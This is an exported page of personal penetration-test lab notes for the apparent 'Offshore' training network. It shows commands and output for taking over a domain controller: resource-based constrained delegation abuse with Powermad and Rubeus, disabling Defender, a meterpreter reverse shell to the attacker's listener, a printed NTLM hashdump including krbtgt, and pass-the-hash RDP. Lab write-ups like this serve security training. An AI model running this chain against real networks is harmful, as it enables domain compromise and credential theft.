<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WS03 - 172.16.2.102</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>WS03 - 172.16.2.102</h1><br/><p><a href="Offshore--WS03_-_172.16.2.102_20.html#OFS-Flag22">Flag 22</a></p><p><a href="Offshore--WS03_-_172.16.2.102_20.html#OFS-Flag23">Flag 23</a></p><p><a href="Offshore--WS03_-_172.16.2.102_20.html#OFS-DEV-ADMIN-DomainAdmin-hash">Domain admin hash for DC02</a></p><p><a href="Offshore--WS03_-_172.16.2.102_20.html#OFS-goMonitor">goMonitor application on WS03</a></p><p></p><p>We can grab the flag on WS03 pretty easily with joe&#39;s credentials</p><p></p><p></p><p><code><span style="background-color:#000000;">└─$ crackmapexec smb 172.16.2.102 -u joe -p &#39;&#39; -x &#39;type c:\users\administrator\desktop\flag.txt&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.2.102    445    WS03             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS03) (domain:dev.ADMIN.OFFSHORE.COM) (signing:False) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.2.102    445    WS03             [+] dev.ADMIN.OFFSHORE.COM\joe: (Pwn3d!)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.2.102    445    WS03             [+] Executed command </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag22"></a>SMB         172.16.2.102    445    WS03             OFFSHORE{ACL_@bus3_0ft3n_ov3rl00k3d}</p><p></p><p>If we run LaZagne on this machine, we see there is a second flag</p><p></p><p><img src="images/20-1.png" alt="images/20-1.png" /></p><p></p><p><a name="OFS-Flag23"></a><code><span style="background-color:#000000;">OFFSHORE{d0nt_s@ve_p@ssw0rds_1n_br0ws3rs!}</span></code></p><p></p><p><a name="OFS-goMonitor"></a>There is something in the run history I notice when going to type a command</p><p></p><p><img src="images/20-2.png" alt="images/20-2.png" /></p><p></p><p>I copy this goMonitor just in case it&#39;s useful later</p><p></p><p>We can see joe has GenericWrite on DC02 in Bloodhound and it suggests abusing this by creating a new machine with Powermad</p><p></p><p>Make our cred token with joe and his blank password then create the new machine with that</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; $username = &#39;dev\joe&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$password = [System.Security.SecureString]::new()</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$cred = [System.Management.Automation.PSCredential]::new($username, $password)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString &#39;password123!&#39; -AsPlainText -Force) -Domain dev.admin.offshore.com -DomainController 172.16.2.6 -credential $cred</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Machine account fake01 added</span></code></p><p></p><p>We then launch Powershell with the machine&#39;s creds</p><p></p><p><code><span style="background-color:#000000;">runas /netonly /user:DEV.ADMIN.OFFSHORE.COM\fake01$ powershell</span></code></p><p></p><p></p><p>Check and makesure that the target computer doest not have the attribute msds-allowedtoactonbehalfofotheridentity enabled</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Get-DomainComputer DC02 -domain dev.admin.offshore.com -server 172.16.2.6 | select name, msds-allowedtoactonbehaldofotheridentity</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">name msds-allowedtoactonbehaldofotheridentity</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">---- ----------------------------------------</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DC02</span></code></p><p></p><p>Get the SID of the fake computer account we created</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Get-DomainComputer -Domain dev.admin.offshore.com fake01 -Properties objectsid | select -Expand objectsid</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">S-1-5-21-1416445593-394318334-2645530166-11101</span></code></p><p></p><p>What we need for the attack:</p><p>Target Computer Name: DC02</p><p>Admin on Target Computer: administrator</p><p>Fake Computer Name: fake01</p><p>Fake Computer SID: S-1-5-21-1416445593-394318334-2645530166-11101</p><p>Fkae Computer Pass: password123!</p><p></p><p><code><span style="background-color:#000000;">$ComputerSid = Get-DomainComputer -Domain dev.admin.offshore.com fake01 -Properties objectsid | select -Expand objectsid</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$SD.GetBinaryForm($SDBytes, 0)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$username = &#39;dev\joe&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$password = [System.Security.SecureString]::new()</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$cred = [System.Management.Automation.PSCredential]::new($username, $password)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Get-DomainComputer dc02.dev.admin.offshore.com -Domain dev.admin.offshore.com -server 172.16.2.6 | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Domain dev.admin.offshore.com -server 172.16.2.6 -credential $cred -verbose</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">VERBOSE: [Get-DomainSearcher] search base: LDAP://172.16.2.6/DC=dev,DC=admin,DC=offshore,DC=com</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&amp;(|(distinguishedname=CN=DC02,OU=Domain Controllers,DC=dev,DC=ADMIN,DC=OFFSHORE,DC=COM)))</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">VERBOSE: [Set-DomainObject] Setting &#39;msds-allowedtoactonbehalfofotheridentity&#39; to &#39;1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 15</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3 62 109 84 254 209 128 23 54 150 175 157 93 43 0 0&#39; for object &#39;DC02$&#39;</span></code></p><p></p><p></p><p>Get the password hash with Rubeus:</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; .\Rubeus.exe hash /password:password123!</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">   ______        _                      </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  (_____ \      | |                     </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">   _____) )_   _| |__  _____ _   _  ___ </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  |  __  /| | | |  _ \| ___ | | | |/___)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  |_|   |_|____/|____/|_____)____/(___/</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  v2.2.0 </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Action: Calculate Password Hash(es)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Input password             : password123!</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*]       rc4_hmac             : 8119935C5F7FA5F57135620C8073AACA</span></code></p><p></p><p>Use Rubeus s4u to impersonate:</p><p></p><p><code><span style="background-color:#000000;">.\Rubeus.exe s4u /user:fake01$ /rc4:8119935C5F7FA5F57135620C8073AACA /impersonateuser:administrator /msdsspn:cifs/dc02.dev.admin.offshore.com /ptt /domain:dev.admin.offshore.com /dc:172.16.2.6</span></code></p><p></p><p>Check if it worked</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; dir \\dc02.dev.admin.offshore.com\c$</span></code></p><p></p><p>    Directory: \\dc02.dev.admin.offshore.com\c$</p><p></p><p></p><p>Mode                LastWriteTime         Length Name                                                                                                                                                                           </p><p>----                -------------         ------ ----                                                                                                                                                                           </p><p>d-----         2/3/2020  11:34 AM                PerfLogs                                                                                                                                                                       </p><p>d-r---        4/20/2022   8:57 AM                Program Files                                                                                                                                                                  </p><p>d-----         2/3/2020  11:03 AM                Program Files (x86)                                                                                                                                                            </p><p>d-r---        7/16/2018  11:22 PM                Users                                                                                                                                                                          </p><p>d-----         5/2/2023   4:27 PM                Windows</p><p></p><p>Now we should be able to psexec into DC02</p><p></p><p><img src="images/20-3.png" alt="images/20-3.png" /></p><p></p><p>Stabilize with RCAT</p><p></p><p><code><span style="background-color:#000000;">└─$ ./rcat listen 10.10.16.94 4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Listening on 10.10.16.94:4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Connection from 10.10.110.3:35548</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Windows PowerShell </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Copyright (C) 2016 Microsoft Corporation. All rights reserved.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; hostname</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">hostname</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DC02</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code></p><p>Turn off Defender so we can upload a msfvenom payload</p><p></p><p><code><span style="background-color:#000000;">Set-MpPreference -DisableRealtimeMonitoring $true</span></code></p><p></p><p>Upload a msfvenom payload, setup the listener, connect, and hashdump</p><p></p><p><code><span style="background-color:#000000;">└─$ msfconsole -q                                                                                     </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 &gt; use multi/handler</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Using configured payload generic/shell_reverse_tcp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">payload =&gt; windows/x64/meterpreter/reverse_tcp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; set LHOST 10.10.16.94</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LHOST =&gt; 10.10.16.94</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; set LPORT 5555</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LPORT =&gt; 5555</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; run</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Started reverse TCP handler on 10.10.16.94:5555 </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Sending stage (200774 bytes) to 10.10.110.3</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Meterpreter session 1 opened (10.10.16.94:5555 -&gt; 10.10.110.3:52974) at 2023-05-02 19:40:47 -0400</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">meterpreter &gt; hashdump</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-DEV-ADMIN-DomainAdmin-hash"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c61f43b6a4db2676714713836b7d2ea6:::</p><p>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p><p>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9404def404bc198fd9830a3483869e78:::</p><p>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p><p>IIS_dev:1105:aad3b435b51404eeaad3b435b51404ee:ce18f9730484ed029749730e2f82b147:::</p><p>joe:1604:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p><p>agent:11102:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::</p><p>DC02$:1000:aad3b435b51404eeaad3b435b51404ee:f76ed24090d10a19c5c47075fd6c573a:::</p><p>WS03$:1104:aad3b435b51404eeaad3b435b51404ee:9c8796117bf0750805e6989f98fcc4fe:::</p><p>fake01$:11101:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::</p><p>ADMIN$:1103:aad3b435b51404eeaad3b435b51404ee:65f7c67d85f612570b9a64640689e9aa:::</p><p>CORP$:1109:aad3b435b51404eeaad3b435b51404ee:c86ea43a257d5548e5c952246d7bfefd:::</p><p></p><p>Check our administrator hash just to be sure</p><p></p><p><img src="images/20-4.png" alt="images/20-4.png" /></p><p></p><p>Also change this registry key so we can login with the hash</p><p></p><p><code><span style="background-color:#000000;">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</span></code></p><p></p><p>RDP in</p><p><code><span style="background-color:#000000;">└─$ xfreerdp /v:172.16.2.6 /u:administrator /pth:&#39;c61f43b6a4db2676714713836b7d2ea6&#39;</span></code></p></div>
</body>
</html>
